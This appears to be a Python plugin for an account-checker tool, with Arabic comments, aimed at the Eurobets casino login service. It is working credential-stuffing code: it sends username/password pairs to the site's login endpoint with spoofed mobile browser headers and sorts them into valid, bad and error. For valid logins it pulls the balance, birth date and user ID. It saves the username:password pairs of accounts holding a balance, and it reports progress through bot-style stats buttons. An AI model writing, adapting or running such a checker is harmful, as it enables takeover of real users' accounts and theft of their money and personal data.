from core.base_checker import BaseChecker
from typing import Dict, Any
import requests
import json
import uuid

class EurobetsChecker(BaseChecker):
    """Eurobets (CasinoController) site checker"""
    
    # الرابط الرئيسي
    LOGIN_URL = "https://www.casinocontroller.com/eurobets/engine/Session/SessionService.php"
    
    # الهيدرات الأساسية
    HEADERS = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        'Accept': "application/json",
        'Content-Type': "application/json",
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': '"Android"',
        'origin': "https://www.casinocontroller.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.casinocontroller.com/eurobets/engine/EmbedGame/EmbedGame.php?game_id=&banner_id=4197364&anon=1&mode=lobby&lang=en",
        'accept-language': "en-US,en;q=0.9",
    }
    
    def generate_user_agent_data(self):
        """توليد بيانات User-Agent عشوائية"""
        chrome_versions = [139, 138, 137]
        chrome_ver = chrome_versions[0]  # نأخذ أحدث إصدار
        
        return {
            "platform": "Android",
            "brands": [
                {"brand": "Chromium", "version": str(chrome_ver)},
                {"brand": "Not;A=Brand", "version": "99"}
            ],
            "mobile": True,
            "fullVersionList": [
                {"brand": "Chromium", "version": f"{chrome_ver}.0.7339.0"},
                {"brand": "Not;A=Brand", "version": "99.0.0.0"}
            ],
            "model": "SM-G998B",  # Samsung Galaxy S21 Ultra
            "platformVersion": "15.0.0",
            "wow64": False
        }
    
    def generate_uuid(self):
        """توليد UUID عشوائي للكوكيز"""
        return str(uuid.uuid4())
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        """Check single Eurobets account"""
        try:
            session = requests.Session()
            session.headers.update(self.HEADERS)
            
            # إضافة كوكيز عشوائية
            session.cookies.update({
                "uuidv4": self.generate_uuid()
            })
            
            # بارامترات الطلب
            params = {
                'jsoncall': "login"
            }
            
            # تحضير بيانات الطلب
            payload = {
                "lang": "en",
                "password": password,
                "username": username,
                "mode": True,
                "extraDeviceDetails": {
                    "maxTouchPoints": 5
                },
                "loginMode": "password",
                "userAgentData": self.generate_user_agent_data()
            }
            
            # إرسال طلب تسجيل الدخول
            response = session.post(
                self.LOGIN_URL,
                params=params,
                json=payload,  # استخدم json بدلاً من data=json.dumps()
                timeout=20
            )
            
            # تحقق من الاستجابة
            if response.status_code != 200:
                return {"status": "bad", "username": username}
            
            data = response.json()
            
            # التحقق من وجود خطأ في تسجيل الدخول
            if data.get("error") != "0":
                error_msg = data.get("error", "UNKNOWN_ERROR")
                if error_msg == "INVALID_PASSWORD":
                    return {"status": "bad", "username": username}
                else:
                    return {"status": "error", "username": username, "error": error_msg}
            
            # استخراج بيانات الحساب
            balance = float(data.get("balance", 0))
            user_id = data.get("user", 0)
            login_name = data.get("login", username)
            country_id = data.get("country_id", 0)
            currency = data.get("currency_abbreviation", "USD")
            currency_symbol = data.get("currency_symbol", "$")
            registration_ts = data.get("registration_ts", 0)
            birth_date = data.get("birth_date", "")
            
            # حساب عمر الحساب بالأيام
            import time
            account_age_days = 0
            if registration_ts:
                account_age_days = (int(time.time()) - registration_ts) // 86400
            
            # تحديد ما إذا كان الحساب به رصيد (أكثر من 0.01$)
            has_balance = balance > 0.01
            
            # رتب بيانات الحساب
            account_data = {
                "login": username,
                "password": password,
                "username": login_name,
                "user_id": user_id,
                "balance": balance,
                "has_balance": has_balance,
                "country_id": country_id,
                "currency": currency,
                "currency_symbol": currency_symbol,
                "birth_date": birth_date,
                "account_age_days": account_age_days,
                "registration_timestamp": registration_ts,
                "hash": data.get("hash", ""),
                "status": data.get("status", 0),
                "mode": data.get("mode", False),
                "require_email_verification": data.get("require_email_verification", False),
                "allow_email": data.get("allow_email", True),
                "allow_phone": data.get("allow_phone", True),
            }
            
            return {
                "status": "valid",
                "account_data": account_data,
                "should_save": self.should_save(account_data)
            }
            
        except requests.exceptions.Timeout:
            return {"status": "error", "username": username, "error": "Timeout"}
        except requests.exceptions.ConnectionError:
            return {"status": "error", "username": username, "error": "Connection error"}
        except json.JSONDecodeError:
            return {"status": "error", "username": username, "error": "Invalid JSON response"}
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        """شروط حفظ الحساب"""
        # الشرط: الرصيد أكبر من 0.01 دولار
        return account_data.get("balance", 0) > 0.01
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        """تنسيق حفظ الحساب في الملف"""
        return f"{account_data['login']}:{account_data['password']} | " \
               f"balance={account_data['currency_symbol']}{account_data['balance']:.2f} | " \
               f"user_id={account_data['user_id']} | " \
               f"username={account_data['username']} | " \
               f"currency={account_data['currency']} | " \
               f"country_id={account_data['country_id']} | " \
               f"account_age={account_data['account_age_days']} days\n"
    
    def get_stats_keyboard(self, stats: Dict[str, int]) -> Dict[str, Any]:
        """تخصيص لوحة الإحصائيات"""
        return {
            "type": "inline_keyboard",
            "buttons": [
                [{"text": f"🔄 Checked: {stats['checked']}/{stats['total']}", "callback_data": "progress"}],
                [
                    {"text": f"✅ Valid: {stats['valid']}", "callback_data": "valid"},
                    {"text": f"❌ Bad: {stats['bad']}", "callback_data": "bad"}
                ],
                [
                    {"text": f"⚠️ Error: {stats['error']}", "callback_data": "error"},
                    {"text": f"💰 Balance>0.01$: {stats['saved']}", "callback_data": "saved"}
                ]
            ]
        }